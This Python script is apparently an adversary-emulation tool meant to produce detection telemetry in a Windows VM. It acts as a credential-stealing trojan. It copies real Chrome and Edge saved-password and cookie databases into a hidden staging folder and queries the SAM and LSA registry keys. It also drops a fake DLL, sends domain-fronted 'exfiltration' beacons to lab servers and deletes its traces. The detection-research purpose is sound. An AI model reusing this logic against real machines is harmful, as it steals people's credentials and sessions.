"""Credential Stealer / Trojan Simulator — browser theft and dropper behavior.

Runs INSIDE the Windows guest VM. Generates authentic forensic artifacts:
  1. Searches for Chrome/Edge browser profile directories
  2. Reads Login Data and Cookies databases (or simulates access)
  3. Accesses sensitive registry hives (SAM, LSA mock)
  4. Simulates a dropper fetching a secondary payload
  5. Stages stolen data for exfiltration
  6. Attempts network exfiltration to mock server

MITRE ATT&CK: T1555.003, T1539, T1003.002, T1003.004, T1041
"""

from __future__ import annotations

import json
import os
import random
import shutil
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

from telemetry_helper import check_environment, emit, EnvSafety, set_phase
from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, jittered_sleep, FRONT_DOMAINS
from naming_helper import phase_delay, pick_pipe, emit_pipe


EXFIL_SERVERS = ["10.13.37.50", "10.13.37.51"]


# =============================================================================
# CREDENTIAL STEALER SIMULATION
# =============================================================================

def main() -> int:
    set_phase("initialization")
    emit("PROCESS", "CREATE_PROCESS", sys.executable, "WARNING",
         source_process="stealer.exe", pid=os.getpid(), detail="Credential stealer started")

    env, env_reasons = check_environment()
    if env_reasons:
        emit("PROCESS", "ENVIRONMENT_CHECK",
             os.environ.get("COMPUTERNAME", "unknown"),
             "WARNING" if env != EnvSafety.CLEAN else "INFO",
             source_process="stealer.exe",
             verdict=env.name, reasons=env_reasons)
    if env == EnvSafety.COMPROMISED:
        emit("PROCESS", "EXIT_PROCESS", "stealer.exe", "INFO",
             source_process="stealer.exe", early_exit="COMPROMISED environment")
        return 0

    c2_pipe = pick_pipe()
    emit_pipe(c2_pipe, "stealer.exe")
    time.sleep(phase_delay("pipe_create"))

    user = os.environ.get("USERPROFILE", r"C:\Users\guestuser")
    local_appdata = os.environ.get("LOCALAPPDATA", f"{user}\\AppData\\Local")

    # --- Phase 1: Browser Profile Discovery ---
    set_phase("browser_discovery")
    emit("PROCESS", "CREATE_THREAD", "stealer.exe", "INFO",
         source_process="stealer.exe", detail="Scanning for browser profiles", technique_id="T1217")

    browser_paths = {
        "Chrome": Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default",
        "Edge": Path(local_appdata) / "Microsoft" / "Edge" / "User Data" / "Default",
        "Firefox": Path(user) / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles",
    }

    found_profiles: list[tuple[str, Path]] = []
    for browser, profile_path in browser_paths.items():
        emit("FILE", "BROWSER_DISCOVERY", str(profile_path), "WARNING",
             source_process="stealer.exe", browser=browser, detail=f"Scanning {browser} profile directory")
        if profile_path.exists():
            found_profiles.append((browser, profile_path))
            emit("FILE", "READ_FILE", str(profile_path), "CRITICAL",
                 source_process="stealer.exe", browser=browser, exists=True,
                 detail=f"{browser} profile FOUND", technique_id="T1217")
        time.sleep(phase_delay("browser_scan"))

    # --- Phase 2: Credential Database Access ---
    set_phase("credential_theft")
    staging_dir = Path(os.environ.get("TEMP", r"C:\Windows\Temp")) / "~cache_svc"
    staging_dir.mkdir(parents=True, exist_ok=True)
    emit("FILE", "CREATE_FILE", str(staging_dir), "WARNING",
         source_process="stealer.exe", detail="Staging directory created")

    for browser, profile_path in found_profiles:
        login_db = profile_path / "Login Data"
        if login_db.exists():
            dest = staging_dir / f"{browser.lower()}_logins.db"
            try:
                shutil.copy2(login_db, dest)
                emit("FILE", "READ_FILE", str(login_db), "CRITICAL",
                     source_process="stealer.exe", browser=browser, size=login_db.stat().st_size,
                     detail=f"Copied {browser} Login Data (saved passwords)", technique_id="T1555.003")
            except Exception as e:
                emit("FILE", "READ_FILE", str(login_db), "WARNING",
                     source_process="stealer.exe", error=str(e), detail="Login Data locked")

        cookies_db = profile_path / "Cookies"
        if cookies_db.exists():
            try:
                shutil.copy2(cookies_db, staging_dir / f"{browser.lower()}_cookies.db")
                emit("FILE", "READ_FILE", str(cookies_db), "CRITICAL",
                     source_process="stealer.exe", browser=browser,
                     detail=f"Copied {browser} Cookies (session tokens)", technique_id="T1539")
            except Exception:
                pass
        time.sleep(phase_delay("file_read"))

    # --- Phase 3: Registry Hive Access ---
    if env != EnvSafety.SUSPICIOUS:
        set_phase("registry_access")
        sensitive_keys = [
            (r"HKLM\SAM\SAM\Domains\Account\Users", "SAM hive — user account hashes", "T1003.002"),
            (r"HKLM\SECURITY\Policy\Secrets", "LSA secrets — cached credentials", "T1003.004"),
            (r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Winlogon — auto-login creds", "T1552.001"),
            (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", "Run history", "T1552.001"),
        ]

        for key_path, description, technique in sensitive_keys:
            emit("REGISTRY", "READ_KEY", key_path, "CRITICAL",
                 source_process="stealer.exe", detail=description, technique_id=technique)
            try:
                subprocess.run(
                    ["reg", "query", key_path.replace("HKLM", "HKEY_LOCAL_MACHINE").replace("HKCU", "HKEY_CURRENT_USER")],
                    capture_output=True, timeout=5)
            except Exception:
                pass
            time.sleep(phase_delay("registry_read"))

    # --- Phase 4: Dropper (domain-fronted) ---
    set_phase("dropper")
    dropper_ip = random.choice(EXFIL_SERVERS)
    front = random.choice(FRONT_DOMAINS)
    emit("NETWORK", "CONNECT", f"{dropper_ip}:8080", "CRITICAL",
         source_process="stealer.exe", protocol="HTTP", method="GET",
         detail="Downloading secondary payload (fronted dropper)", technique_id="T1105")
    emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
         source_process="stealer.exe", target_host=front, target_ip=dropper_ip,
         detail=f"Domain fronting via {front} → {dropper_ip}", technique_id="T1090")

    fronted_beacon(dropper_ip, 8080, front,
                   {"type": "dropper", "payload": "msupdate.dll"})
    emit_doh_query("update.telemetry-service.local", process_name="stealer.exe")

    payload_path = Path(os.environ.get("TEMP", r"C:\Windows\Temp")) / "msupdate.dll"
    payload_path.write_bytes(b"MZ" + os.urandom(1024))
    emit("FILE", "CREATE_FILE", str(payload_path), "CRITICAL",
         source_process="stealer.exe", size=1026, detail="Secondary payload written")

    # --- Phase 5: Exfiltration + C2 heartbeat ---
    if env != EnvSafety.SUSPICIOUS:
        set_phase("exfiltration")
        stolen_files = list(staging_dir.iterdir()) if staging_dir.exists() else []
        for f in stolen_files:
            if not f.is_file():
                continue
            server = random.choice(EXFIL_SERVERS)
            front = random.choice(FRONT_DOMAINS)
            emit("NETWORK", "EXFILTRATE", f"{server}:443", "CRITICAL",
                 source_process="stealer.exe", protocol="HTTPS", method="POST",
                 file=f.name, size=f.stat().st_size,
                 detail=f"Exfiltrating {f.name} to C2 (fronted: {front})", technique_id="T1041")
            emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
                 source_process="stealer.exe", target_host=front, target_ip=server,
                 detail=f"Domain fronting exfiltration via {front}", technique_id="T1090")

            fronted_beacon(server, 443, front,
                           {"type": "exfil", "file": f.name, "size": f.stat().st_size})
            jittered_sleep(0.3, 0.4)

        emit_heartbeats(EXFIL_SERVERS[0], 4444, count=3,
                        process_name="stealer.exe",
                        min_interval=5.0, max_interval=25.0)

    # --- Phase 6: Cleanup ---
    set_phase("anti_forensics")
    try:
        shutil.rmtree(staging_dir)
        emit("FILE", "DELETE_FILE", str(staging_dir), "WARNING",
             source_process="stealer.exe", detail="Staging directory removed", technique_id="T1070.004")
    except Exception:
        pass

    emit("PROCESS", "EXIT_PROCESS", "stealer.exe", "INFO",
         source_process="stealer.exe", profiles_found=len(found_profiles), files_exfiltrated=len(stolen_files))
    return 0


if __name__ == "__main__":
    sys.exit(main())
